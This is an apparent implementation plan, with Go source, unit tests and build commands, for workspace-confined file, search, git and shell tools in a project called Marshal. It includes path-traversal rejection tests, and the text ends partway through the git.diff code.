# Milestone E Basic Native Tools Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Implement Marshal's first concrete native tools: `file.read`, `repo.search`, `git.status`, `git.diff`, `shell.run`, and `test.run`.

**Architecture:** Add a single `internal/tools/native` package that registers all six tools into the existing `internal/tools/registry` framework. Shared helpers handle workspace path safety, JSON argument decoding, command running, command guardrails, and output limiting.

**Tech Stack:** Go 1.26.1, standard library only (`context`, `encoding/json`, `errors`, `fmt`, `io/fs`, `os`, `os/exec`, `path/filepath`, `sort`, `strings`, `time`, `testing`).

## Global Constraints

- Do not add approval prompts, TUI approval flows, or policy UI.
- Do not persist audit events.
- Do not add an agent tool-use loop.
- Do not implement patch application.
- Do not implement `.gitignore` parsing.
- Do not implement full shell command classification; only block the obvious dangerous patterns specified in the design.
- Do not stream command output live into the TUI.
- Do not add MCP/plugin tools.
- Do not add Tree-sitter or symbol tools.
- Do not add third-party dependencies.
- Keep the implementation in `internal/tools/native` and import only `internal/tools/registry` from Marshal internals.
- Use TDD for every behavior change: write failing tests first, verify failure, implement, verify pass.
- Keep `CLAUDE.md` untracked and untouched.
- Run `gofmt` on all created Go files before committing.

---

## File Structure

- Create `internal/tools/native/native.go`
  Defines public `Options`, `CommandRunner`, `CommandRequest`, `CommandResult`, `RegisterAll`, defaults, and shared `toolSet`.
- Create `internal/tools/native/helpers.go`
  Defines JSON arg decoding, workspace path resolution, relative path conversion, and output limiting.
- Create `internal/tools/native/runner.go`
  Defines the default `exec.CommandContext` runner.
- Create `internal/tools/native/file.go`
  Implements `file.read`.
- Create `internal/tools/native/search.go`
  Implements `repo.search`.
- Create `internal/tools/native/git.go`
  Implements `git.status` and `git.diff`.
- Create `internal/tools/native/command.go`
  Implements `shell.run`, `test.run`, command guardrails, command output formatting, and timeout clamping.
- Create `internal/tools/native/native_test.go`
  Tests registration, options/defaults, fake command runner helpers, and output limiting.
- Create `internal/tools/native/file_test.go`
  Tests `file.read`.
- Create `internal/tools/native/search_test.go`
  Tests `repo.search`.
- Create `internal/tools/native/git_test.go`
  Tests `git.status` and `git.diff`.
- Create `internal/tools/native/command_test.go`
  Tests `shell.run` and `test.run`.
- Modify `docs/10-mvp-implementation-checklist.md`
  Mark Milestone E complete after implementation and verification.

---

### Task 1: Native Package Foundation and Registration

**Files:**
- Create: `internal/tools/native/native.go`
- Create: `internal/tools/native/helpers.go`
- Create: `internal/tools/native/runner.go`
- Create: `internal/tools/native/native_test.go`

**Interfaces:**
- Produces:
  - `type Options struct { WorkspaceRoot string; CommandRunner CommandRunner; TestCommand string; MaxOutputBytes int }`
  - `type CommandRunner interface { Run(ctx context.Context, req CommandRequest) (CommandResult, error) }`
  - `type CommandRequest struct { Command string; Dir string; Timeout time.Duration }`
  - `type CommandResult struct { Stdout string; Stderr string; ExitCode int }`
  - `func RegisterAll(reg *registry.Registry, opts Options) error`
  - shared unexported helpers used by later tasks:
    - `func newToolSet(opts Options) (*toolSet, error)`
    - `func decodeArgs[T any](tool registry.Tool, raw json.RawMessage) (T, error)`
    - `func resolveWorkspacePath(root string, rel string) (string, error)`
    - `func workspaceRel(root string, abs string) (string, error)`
    - `func limitOutput(s string, maxBytes int) string`

- [ ] **Step 1: Create package directory**

Run:

```bash
mkdir -p internal/tools/native
```

Expected: directory exists.

- [ ] **Step 2: Write failing registration/helper tests**

Create `internal/tools/native/native_test.go`:

```go
package native

import (
	"context"
	"strings"
	"testing"
	"time"

	"marshal/internal/tools/registry"
)

func TestRegisterAllRegistersExpectedTools(t *testing.T) {
	root := t.TempDir()
	reg := registry.New()

	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: &fakeRunner{}}); err != nil {
		t.Fatalf("RegisterAll returned error: %v", err)
	}

	want := map[string]registry.RiskLevel{
		"file.read":   registry.RiskReadOnly,
		"repo.search": registry.RiskReadOnly,
		"git.status":  registry.RiskReadOnly,
		"git.diff":    registry.RiskReadOnly,
		"shell.run":   registry.RiskCommand,
		"test.run":    registry.RiskCommand,
	}
	if got := reg.List(); len(got) != len(want) {
		t.Fatalf("len(List()) = %d, want %d", len(got), len(want))
	}
	for name, risk := range want {
		tool, ok := reg.Lookup(name)
		if !ok {
			t.Fatalf("Lookup(%q) ok=false", name)
		}
		if tool.Risk != risk {
			t.Fatalf("%s risk = %q, want %q", name, tool.Risk, risk)
		}
		if tool.Handler == nil {
			t.Fatalf("%s Handler is nil", name)
		}
		if len(tool.Schema) == 0 {
			t.Fatalf("%s Schema is empty", name)
		}
	}
}

func TestRegisterAllRequiresWorkspaceRoot(t *testing.T) {
	err := RegisterAll(registry.New(), Options{CommandRunner: &fakeRunner{}})
	if err == nil {
		t.Fatal("RegisterAll returned nil error, want workspace root error")
	}
	if !strings.Contains(err.Error(), "workspace root") {
		t.Fatalf("error = %q, want workspace root", err.Error())
	}
}

func TestResolveWorkspacePathRejectsTraversalAndAbsolutePaths(t *testing.T) {
	root := t.TempDir()

	if _, err := resolveWorkspacePath(root, "../outside"); err == nil {
		t.Fatal("resolveWorkspacePath traversal returned nil error")
	}
	if _, err := resolveWorkspacePath(root, root); err == nil {
		t.Fatal("resolveWorkspacePath absolute path returned nil error")
	}
}

func TestLimitOutputTruncatesWithMarker(t *testing.T) {
	got := limitOutput("abcdef", 3)
	if got != "abc\n[output truncated]" {
		t.Fatalf("limitOutput = %q", got)
	}
}

type fakeRunner struct {
	requests []CommandRequest
	result   CommandResult
	err      error
}

func (f *fakeRunner) Run(ctx context.Context, req CommandRequest) (CommandResult, error) {
	f.requests = append(f.requests, req)
	if req.Timeout <= 0 {
		return CommandResult{}, context.DeadlineExceeded
	}
	return f.result, f.err
}

func invokeTool(t *testing.T, reg *registry.Registry, name string, args string) (registry.ToolResult, error) {
	t.Helper()
	tool, ok := reg.Lookup(name)
	if !ok {
		t.Fatalf("Lookup(%q) ok=false", name)
	}
	return tool.Handler(context.Background(), registry.ToolCall{Name: name, Args: []byte(args)})
}

func assertTimeout(t *testing.T, got time.Duration, want time.Duration) {
	t.Helper()
	if got != want {
		t.Fatalf("timeout = %s, want %s", got, want)
	}
}
```

- [ ] **Step 3: Run tests to verify they fail**

Run:

```bash
go test ./internal/tools/native
```

Expected: FAIL with undefined symbols such as `RegisterAll`, `Options`, `CommandRequest`, `resolveWorkspacePath`, and `limitOutput`.

- [ ] **Step 4: Implement foundation**

Create `internal/tools/native/native.go`:

```go
package native

import (
	"context"
	"errors"
	"fmt"
	"path/filepath"
	"time"

	"marshal/internal/tools/registry"
)

const (
	defaultMaxOutputBytes = 200000
	defaultTestCommand    = "go test ./..."
)

type Options struct {
	WorkspaceRoot  string
	CommandRunner  CommandRunner
	TestCommand    string
	MaxOutputBytes int
}

type CommandRunner interface {
	Run(ctx context.Context, req CommandRequest) (CommandResult, error)
}

type CommandRequest struct {
	Command string
	Dir     string
	Timeout time.Duration
}

type CommandResult struct {
	Stdout   string
	Stderr   string
	ExitCode int
}

type toolSet struct {
	root           string
	runner         CommandRunner
	testCommand    string
	maxOutputBytes int
}

func RegisterAll(reg *registry.Registry, opts Options) error {
	tools, err := newToolSet(opts)
	if err != nil {
		return err
	}

	for _, tool := range []registry.Tool{
		tools.fileReadTool(),
		tools.repoSearchTool(),
		tools.gitStatusTool(),
		tools.gitDiffTool(),
		tools.shellRunTool(),
		tools.testRunTool(),
	} {
		if err := reg.Register(tool); err != nil {
			return err
		}
	}
	return nil
}

func newToolSet(opts Options) (*toolSet, error) {
	if opts.WorkspaceRoot == "" {
		return nil, errors.New("workspace root is required")
	}

	root, err := filepath.Abs(opts.WorkspaceRoot)
	if err != nil {
		return nil, fmt.Errorf("resolve workspace root: %w", err)
	}

	runner := opts.CommandRunner
	if runner == nil {
		runner = execRunner{}
	}

	testCommand := opts.TestCommand
	if testCommand == "" {
		testCommand = defaultTestCommand
	}

	maxOutputBytes := opts.MaxOutputBytes
	if maxOutputBytes <= 0 {
		maxOutputBytes = defaultMaxOutputBytes
	}

	return &toolSet{
		root:           root,
		runner:         runner,
		testCommand:    testCommand,
		maxOutputBytes: maxOutputBytes,
	}, nil
}
```

Create `internal/tools/native/helpers.go`:

```go
package native

import (
	"encoding/json"
	"errors"
	"fmt"
	"path/filepath"
	"strings"

	"marshal/internal/tools/registry"
)

const truncationMarker = "\n[output truncated]"

func decodeArgs[T any](tool registry.Tool, raw json.RawMessage) (T, error) {
	var zero T
	if err := registry.ValidateArgs(tool, raw); err != nil {
		return zero, err
	}
	if len(raw) == 0 {
		raw = json.RawMessage(`{}`)
	}
	if err := json.Unmarshal(raw, &zero); err != nil {
		return zero, fmt.Errorf("decode %s arguments: %w", tool.Name, err)
	}
	return zero, nil
}

func resolveWorkspacePath(root string, rel string) (string, error) {
	if filepath.IsAbs(rel) {
		return "", fmt.Errorf("path %q must be relative", rel)
	}
	cleaned := filepath.Clean(rel)
	if cleaned == "." {
		return root, nil
	}
	full := filepath.Join(root, cleaned)
	relative, err := filepath.Rel(root, full)
	if err != nil {
		return "", fmt.Errorf("resolve path %q: %w", rel, err)
	}
	if relative == ".." || strings.HasPrefix(relative, ".."+string(filepath.Separator)) {
		return "", fmt.Errorf("path %q escapes workspace", rel)
	}
	return full, nil
}

func workspaceRel(root string, abs string) (string, error) {
	rel, err := filepath.Rel(root, abs)
	if err != nil {
		return "", err
	}
	if rel == ".." || strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
		return "", errors.New("path escapes workspace")
	}
	return filepath.ToSlash(rel), nil
}

func limitOutput(s string, maxBytes int) string {
	if maxBytes <= 0 || len(s) <= maxBytes {
		return s
	}
	return s[:maxBytes] + truncationMarker
}
```

Create `internal/tools/native/runner.go`:

```go
package native

import (
	"bytes"
	"context"
	"os/exec"
)

type execRunner struct{}

func (execRunner) Run(ctx context.Context, req CommandRequest) (CommandResult, error) {
	cmd := exec.CommandContext(ctx, "/bin/sh", "-lc", req.Command)
	cmd.Dir = req.Dir

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()
	result := CommandResult{
		Stdout: stdout.String(),
		Stderr: stderr.String(),
	}
	if cmd.ProcessState != nil {
		result.ExitCode = cmd.ProcessState.ExitCode()
	}
	return result, err
}
```

- [ ] **Step 5: Add temporary no-op tool methods so registration compiles**

Create temporary minimal files for methods that later tasks will replace with real handlers. These methods are intentionally no-op handlers so Task 1 can verify registration metadata before the per-tool behavior tasks are implemented.

Create `internal/tools/native/file.go`:

```go
package native

import (
	"context"
	"encoding/json"

	"marshal/internal/tools/registry"
)

func (t *toolSet) fileReadTool() registry.Tool {
	return registry.Tool{Name: "file.read", Description: "Read a workspace file", Schema: json.RawMessage(`{"type":"object"}`), Risk: registry.RiskReadOnly, Handler: func(ctx context.Context, call registry.ToolCall) (registry.ToolResult, error) {
		return registry.ToolResult{}, nil
	}}
}
```

Create `internal/tools/native/search.go`:

```go
package native

import (
	"context"
	"encoding/json"

	"marshal/internal/tools/registry"
)

func (t *toolSet) repoSearchTool() registry.Tool {
	return registry.Tool{Name: "repo.search", Description: "Search workspace files", Schema: json.RawMessage(`{"type":"object"}`), Risk: registry.RiskReadOnly, Handler: func(ctx context.Context, call registry.ToolCall) (registry.ToolResult, error) {
		return registry.ToolResult{}, nil
	}}
}
```

Create `internal/tools/native/git.go`:

```go
package native

import (
	"context"
	"encoding/json"

	"marshal/internal/tools/registry"
)

func (t *toolSet) gitStatusTool() registry.Tool {
	return registry.Tool{Name: "git.status", Description: "Show git status", Schema: json.RawMessage(`{"type":"object"}`), Risk: registry.RiskReadOnly, Handler: func(ctx context.Context, call registry.ToolCall) (registry.ToolResult, error) {
		return registry.ToolResult{}, nil
	}}
}

func (t *toolSet) gitDiffTool() registry.Tool {
	return registry.Tool{Name: "git.diff", Description: "Show git diff", Schema: json.RawMessage(`{"type":"object"}`), Risk: registry.RiskReadOnly, Handler: func(ctx context.Context, call registry.ToolCall) (registry.ToolResult, error) {
		return registry.ToolResult{}, nil
	}}
}
```

Create `internal/tools/native/command.go`:

```go
package native

import (
	"context"
	"encoding/json"

	"marshal/internal/tools/registry"
)

func (t *toolSet) shellRunTool() registry.Tool {
	return registry.Tool{Name: "shell.run", Description: "Run a shell command", Schema: json.RawMessage(`{"type":"object"}`), Risk: registry.RiskCommand, Handler: func(ctx context.Context, call registry.ToolCall) (registry.ToolResult, error) {
		return registry.ToolResult{}, nil
	}}
}

func (t *toolSet) testRunTool() registry.Tool {
	return registry.Tool{Name: "test.run", Description: "Run the configured test command", Schema: json.RawMessage(`{"type":"object"}`), Risk: registry.RiskCommand, Handler: func(ctx context.Context, call registry.ToolCall) (registry.ToolResult, error) {
		return registry.ToolResult{}, nil
	}}
}
```

- [ ] **Step 6: Run tests to verify Task 1 passes**

Run:

```bash
gofmt -w internal/tools/native
go test ./internal/tools/native
```

Expected: PASS.

- [ ] **Step 7: Commit Task 1**

Run:

```bash
git add internal/tools/native
git commit -m "feat: scaffold native tool registration"
```

Expected: commit succeeds.

---

### Task 2: `file.read`

**Files:**
- Modify: `internal/tools/native/file.go`
- Create: `internal/tools/native/file_test.go`

**Interfaces:**
- Consumes:
  - `toolSet.fileReadTool() registry.Tool`
  - `decodeArgs`
  - `resolveWorkspacePath`
  - `limitOutput`
- Produces:
  - real `file.read` handler

- [ ] **Step 1: Write failing `file.read` tests**

Create `internal/tools/native/file_test.go`:

```go
package native

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"marshal/internal/tools/registry"
)

func TestFileReadReadsWholeFile(t *testing.T) {
	root := t.TempDir()
	writeFile(t, filepath.Join(root, "README.md"), "one\ntwo\nthree\n")
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: &fakeRunner{}}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	result, err := invokeTool(t, reg, "file.read", `{"path":"README.md"}`)
	if err != nil {
		t.Fatalf("file.read returned error: %v", err)
	}
	if result.Content != "one\ntwo\nthree\n" {
		t.Fatalf("Content = %q", result.Content)
	}
	if !strings.Contains(result.Summary, "README.md") {
		t.Fatalf("Summary = %q, want path", result.Summary)
	}
}

func TestFileReadReadsLineRange(t *testing.T) {
	root := t.TempDir()
	writeFile(t, filepath.Join(root, "notes.txt"), "one\ntwo\nthree\nfour\n")
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: &fakeRunner{}}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	result, err := invokeTool(t, reg, "file.read", `{"path":"notes.txt","start_line":2,"end_line":3}`)
	if err != nil {
		t.Fatalf("file.read returned error: %v", err)
	}
	if result.Content != "two\nthree" {
		t.Fatalf("Content = %q, want selected lines", result.Content)
	}
}

func TestFileReadRejectsTraversal(t *testing.T) {
	root := t.TempDir()
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: &fakeRunner{}}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	_, err := invokeTool(t, reg, "file.read", `{"path":"../secret.txt"}`)
	if err == nil {
		t.Fatal("file.read traversal returned nil error")
	}
}

func TestFileReadRejectsInvalidRange(t *testing.T) {
	root := t.TempDir()
	writeFile(t, filepath.Join(root, "notes.txt"), "one\ntwo\n")
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: &fakeRunner{}}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	_, err := invokeTool(t, reg, "file.read", `{"path":"notes.txt","start_line":3,"end_line":2}`)
	if err == nil {
		t.Fatal("file.read invalid range returned nil error")
	}
}

func writeFile(t *testing.T, path string, contents string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}
	if err := os.WriteFile(path, []byte(contents), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run:

```bash
go test ./internal/tools/native
```

Expected: FAIL because `file.read` currently returns empty content and no errors.

- [ ] **Step 3: Implement `file.read`**

Replace `internal/tools/native/file.go` with:

```go
package native

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"strings"

	"marshal/internal/tools/registry"
)

type fileReadArgs struct {
	Path      string `json:"path"`
	StartLine int    `json:"start_line"`
	EndLine   int    `json:"end_line"`
}

func (t *toolSet) fileReadTool() registry.Tool {
	tool := registry.Tool{
		Name:        "file.read",
		Description: "Read a workspace file, optionally limited to a 1-based line range.",
		Schema: json.RawMessage(`{"type":"object","properties":{"path":{"type":"string"},"start_line":{"type":"integer"},"end_line":{"type":"integer"}},"required":["path"]}`),
		Risk: registry.RiskReadOnly,
	}
	tool.Handler = func(ctx context.Context, call registry.ToolCall) (registry.ToolResult, error) {
		args, err := decodeArgs[fileReadArgs](tool, call.Args)
		if err != nil {
			return registry.ToolResult{}, err
		}
		if args.Path == "" {
			return registry.ToolResult{}, fmt.Errorf("file.read path is required")
		}
		if args.StartLine > 0 && args.EndLine > 0 && args.StartLine > args.EndLine {
			return registry.ToolResult{}, fmt.Errorf("file.read start_line must be <= end_line")
		}

		path, err := resolveWorkspacePath(t.root, args.Path)
		if err != nil {
			return registry.ToolResult{}, err
		}
		info, err := os.Stat(path)
		if err != nil {
			return registry.ToolResult{}, fmt.Errorf("stat %s: %w", args.Path, err)
		}
		if !info.Mode().IsRegular() {
			return registry.ToolResult{}, fmt.Errorf("%s is not a regular file", args.Path)
		}

		data, err := os.ReadFile(path)
		if err != nil {
			return registry.ToolResult{}, fmt.Errorf("read %s: %w", args.Path, err)
		}

		content, start, end := selectLines(string(data), args.StartLine, args.EndLine)
		content = limitOutput(content, t.maxOutputBytes)
		return registry.ToolResult{
			Summary: fmt.Sprintf("read %s lines %d-%d", args.Path, start, end),
			Content: content,
		}, nil
	}
	return tool
}

func selectLines(content string, startLine int, endLine int) (string, int, int) {
	lines := strings.Split(content, "\n")
	if len(lines) > 0 && lines[len(lines)-1] == "" {
		lines = lines[:len(lines)-1]
	}
	if startLine <= 0 {
		startLine = 1
	}
	if endLine <= 0 || endLine > len(lines) {
		endLine = len(lines)
	}
	if startLine > len(lines) {
		return "", startLine, endLine
	}
	selected := strings.Join(lines[startLine-1:endLine], "\n")
	if endLine == len(lines) && strings.HasSuffix(content, "\n") {
		selected += "\n"
	}
	return selected, startLine, endLine
}
```

- [ ] **Step 4: Run tests to verify Task 2 passes**

Run:

```bash
gofmt -w internal/tools/native/file.go internal/tools/native/file_test.go
go test ./internal/tools/native
```

Expected: PASS.

- [ ] **Step 5: Commit Task 2**

Run:

```bash
git add internal/tools/native/file.go internal/tools/native/file_test.go
git commit -m "feat: add file read tool"
```

Expected: commit succeeds.

---

### Task 3: `repo.search`

**Files:**
- Modify: `internal/tools/native/search.go`
- Create: `internal/tools/native/search_test.go`

**Interfaces:**
- Consumes:
  - `toolSet.repoSearchTool() registry.Tool`
  - `decodeArgs`
  - `resolveWorkspacePath`
  - `workspaceRel`
  - `limitOutput`
- Produces:
  - real `repo.search` handler

- [ ] **Step 1: Write failing `repo.search` tests**

Create `internal/tools/native/search_test.go`:

```go
package native

import (
	"path/filepath"
	"strings"
	"testing"

	"marshal/internal/tools/registry"
)

func TestRepoSearchFindsSubstringMatches(t *testing.T) {
	root := t.TempDir()
	writeFile(t, filepath.Join(root, "a.txt"), "alpha\nneedle here\n")
	writeFile(t, filepath.Join(root, "sub", "b.txt"), "another needle\n")
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: &fakeRunner{}}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	result, err := invokeTool(t, reg, "repo.search", `{"query":"needle"}`)
	if err != nil {
		t.Fatalf("repo.search returned error: %v", err)
	}
	for _, want := range []string{"a.txt:2:needle here", "sub/b.txt:1:another needle"} {
		if !strings.Contains(result.Content, want) {
			t.Fatalf("Content missing %q:\n%s", want, result.Content)
		}
	}
}

func TestRepoSearchRespectsMaxResults(t *testing.T) {
	root := t.TempDir()
	writeFile(t, filepath.Join(root, "a.txt"), "needle 1\nneedle 2\nneedle 3\n")
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: &fakeRunner{}}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	result, err := invokeTool(t, reg, "repo.search", `{"query":"needle","max_results":2}`)
	if err != nil {
		t.Fatalf("repo.search returned error: %v", err)
	}
	if strings.Count(result.Content, "a.txt:") != 2 {
		t.Fatalf("Content = %q, want 2 results", result.Content)
	}
	if !strings.Contains(result.Summary, "capped") {
		t.Fatalf("Summary = %q, want capped", result.Summary)
	}
}

func TestRepoSearchSkipsIgnoredDirectories(t *testing.T) {
	root := t.TempDir()
	writeFile(t, filepath.Join(root, ".git", "config"), "needle\n")
	writeFile(t, filepath.Join(root, "node_modules", "pkg", "index.js"), "needle\n")
	writeFile(t, filepath.Join(root, "src", "main.go"), "needle\n")
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: &fakeRunner{}}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	result, err := invokeTool(t, reg, "repo.search", `{"query":"needle"}`)
	if err != nil {
		t.Fatalf("repo.search returned error: %v", err)
	}
	if strings.Contains(result.Content, ".git/") || strings.Contains(result.Content, "node_modules/") {
		t.Fatalf("Content included ignored directory:\n%s", result.Content)
	}
	if !strings.Contains(result.Content, "src/main.go:1:needle") {
		t.Fatalf("Content missing src match:\n%s", result.Content)
	}
}

func TestRepoSearchRejectsEmptyQueryAndTraversal(t *testing.T) {
	root := t.TempDir()
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: &fakeRunner{}}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	if _, err := invokeTool(t, reg, "repo.search", `{"query":""}`); err == nil {
		t.Fatal("repo.search empty query returned nil error")
	}
	if _, err := invokeTool(t, reg, "repo.search", `{"query":"x","path":"../outside"}`); err == nil {
		t.Fatal("repo.search traversal returned nil error")
	}
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run:

```bash
go test ./internal/tools/native
```

Expected: FAIL because `repo.search` currently returns empty content and no validation errors.

- [ ] **Step 3: Implement `repo.search`**

Replace `internal/tools/native/search.go` with:

```go
package native

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"

	"marshal/internal/tools/registry"
)

const defaultSearchMaxResults = 50
const hardSearchMaxResults = 200

type repoSearchArgs struct {
	Query      string `json:"query"`
	Path       string `json:"path"`
	MaxResults int    `json:"max_results"`
}

func (t *toolSet) repoSearchTool() registry.Tool {
	tool := registry.Tool{
		Name:        "repo.search",
		Description: "Search workspace files for a case-sensitive substring.",
		Schema: json.RawMessage(`{"type":"object","properties":{"query":{"type":"string"},"path":{"type":"string"},"max_results":{"type":"integer"}},"required":["query"]}`),
		Risk: registry.RiskReadOnly,
	}
	tool.Handler = func(ctx context.Context, call registry.ToolCall) (registry.ToolResult, error) {
		args, err := decodeArgs[repoSearchArgs](tool, call.Args)
		if err != nil {
			return registry.ToolResult{}, err
		}
		if args.Query == "" {
			return registry.ToolResult{}, fmt.Errorf("repo.search query is required")
		}
		limit := args.MaxResults
		if limit <= 0 {
			limit = defaultSearchMaxResults
		}
		if limit > hardSearchMaxResults {
			limit = hardSearchMaxResults
		}

		start := t.root
		if args.Path != "" {
			start, err = resolveWorkspacePath(t.root, args.Path)
			if err != nil {
				return registry.ToolResult{}, err
			}
		}

		matches, capped, err := t.searchFiles(ctx, start, args.Query, limit)
		if err != nil {
			return registry.ToolResult{}, err
		}
		content := limitOutput(strings.Join(matches, "\n"), t.maxOutputBytes)
		summary := fmt.Sprintf("found %d matches", len(matches))
		if capped {
			summary += " (capped)"
		}
		return registry.ToolResult{Summary: summary, Content: content}, nil
	}
	return tool
}

func (t *toolSet) searchFiles(ctx context.Context, start string, query string, limit int) ([]string, bool, error) {
	var files []string
	err := filepath.WalkDir(start, func(path string, entry os.DirEntry, err error) error {
		if err != nil {
			return nil
		}
		if err := ctx.Err(); err != nil {
			return err
		}
		if entry.IsDir() {
			if shouldSkipSearchDir(entry.Name()) && path != start {
				return filepath.SkipDir
			}
			return nil
		}
		if entry.Type().IsRegular() {
			files = append(files, path)
		}
		return nil
	})
	if err != nil {
		return nil, false, err
	}
	sort.Strings(files)

	var matches []string
	capped := false
	for _, path := range files {
		fileMatches := t.searchFile(path, query, limit-len(matches))
		matches = append(matches, fileMatches...)
		if len(matches) >= limit {
			capped = true
			break
		}
	}
	return matches, capped, nil
}

func (t *toolSet) searchFile(path string, query string, remaining int) []string {
	if remaining <= 0 {
		return nil
	}
	file, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer file.Close()

	rel, err := workspaceRel(t.root, path)
	if err != nil {
		return nil
	}
	scanner := bufio.NewScanner(file)
	scanner.Buffer(make([]byte, 64*1024), 1024*1024)
	var matches []string
	lineNo := 0
	for scanner.Scan() {
		lineNo++
		line := scanner.Text()
		if strings.Contains(line, query) {
			matches = append(matches, fmt.Sprintf("%s:%d:%s", rel, lineNo, line))
			if len(matches) >= remaining {
				return matches
			}
		}
	}
	return matches
}

func shouldSkipSearchDir(name string) bool {
	switch name {
	case ".git", ".idea", ".superpowers", ".worktrees", "node_modules", "vendor", "dist":
		return true
	default:
		return false
	}
}
```

- [ ] **Step 4: Run tests to verify Task 3 passes**

Run:

```bash
gofmt -w internal/tools/native/search.go internal/tools/native/search_test.go
go test ./internal/tools/native
```

Expected: PASS.

- [ ] **Step 5: Commit Task 3**

Run:

```bash
git add internal/tools/native/search.go internal/tools/native/search_test.go
git commit -m "feat: add repo search tool"
```

Expected: commit succeeds.

---

### Task 4: Git Inspection Tools

**Files:**
- Modify: `internal/tools/native/git.go`
- Create: `internal/tools/native/git_test.go`

**Interfaces:**
- Consumes:
  - `CommandRunner`
  - `CommandRequest`
  - `resolveWorkspacePath`
  - `workspaceRel`
  - `limitOutput`
- Produces:
  - real `git.status` handler
  - real `git.diff` handler

- [ ] **Step 1: Write failing git tool tests**

Create `internal/tools/native/git_test.go`:

```go
package native

import (
	"strings"
	"testing"

	"marshal/internal/tools/registry"
)

func TestGitStatusInvokesRunner(t *testing.T) {
	root := t.TempDir()
	runner := &fakeRunner{result: CommandResult{Stdout: " M file.go\n", ExitCode: 0}}
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: runner}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	result, err := invokeTool(t, reg, "git.status", `{}`)
	if err != nil {
		t.Fatalf("git.status returned error: %v", err)
	}
	if len(runner.requests) != 1 {
		t.Fatalf("runner requests = %d, want 1", len(runner.requests))
	}
	if runner.requests[0].Command != "git status --short" {
		t.Fatalf("command = %q", runner.requests[0].Command)
	}
	if runner.requests[0].Dir != root {
		t.Fatalf("dir = %q, want root", runner.requests[0].Dir)
	}
	if result.CommandExitCode == nil || *result.CommandExitCode != 0 {
		t.Fatalf("CommandExitCode = %#v", result.CommandExitCode)
	}
	if !strings.Contains(result.Content, "M file.go") {
		t.Fatalf("Content = %q", result.Content)
	}
}

func TestGitDiffInvokesRunnerWithOptionalPath(t *testing.T) {
	root := t.TempDir()
	runner := &fakeRunner{result: CommandResult{Stdout: "diff --git a/file.go b/file.go\n", ExitCode: 0}}
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: runner}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	result, err := invokeTool(t, reg, "git.diff", `{"path":"file.go"}`)
	if err != nil {
		t.Fatalf("git.diff returned error: %v", err)
	}
	if runner.requests[0].Command != "git diff -- 'file.go'" {
		t.Fatalf("command = %q", runner.requests[0].Command)
	}
	if !strings.Contains(result.Summary, "diff present") {
		t.Fatalf("Summary = %q", result.Summary)
	}
}

func TestGitDiffRejectsTraversal(t *testing.T) {
	root := t.TempDir()
	runner := &fakeRunner{}
	reg := registry.New()
	if err := RegisterAll(reg, Options{WorkspaceRoot: root, CommandRunner: runner}); err != nil {
		t.Fatalf("RegisterAll: %v", err)
	}

	if _, err := invokeTool(t, reg, "git.diff", `{"path":"../outside"}`); err == nil {
		t.Fatal("git.diff traversal returned nil error")
	}
	if len(runner.requests) != 0 {
		t.Fatalf("runner called %d times, want 0", len(runner.requests))
	}
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run:

```bash
go test ./internal/tools/native
```

Expected: FAIL because git tools currently return empty results and do not call the runner.

- [ ] **Step 3: Implement git tools**

Replace `internal/tools/native/git.go` with:

```go
package native

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"marshal/internal/tools/registry"
)

type gitDiffArgs struct {
	Path string `json:"path"`
}

func (t *toolSet) gitStatusTool() registry.Tool {
	tool := registry.Tool{
		Name:        "git.status",
		Description: "Show git status --short for the workspace.",
		Schema:      json.RawMessage(`{"type":"object","properties":{}}`),
		Risk:        registry.RiskReadOnly,
	}
	tool.Handler = func(ctx context.Context, call registry.ToolCall) (registry.ToolResult, error) {
		if _, err := decodeArgs[struct{}](tool, call.Args); err != nil {
			return registry.ToolResult{}, err
		}
		return t.runReadOnlyCommand(ctx, "git status --short", 30*time.Second, func(stdout string) string {
			if strings.TrimSpace(stdout) == "" {
				return "working tree clean"
			}
			return "working tree has changes"
		})
	}
	return tool
}

func (t *toolSet) gitDiffTool() registry.Tool {
	tool := registry.Tool{
		Name:        "git.diff",
		Description: "Show git diff for the workspace or a relative path.",
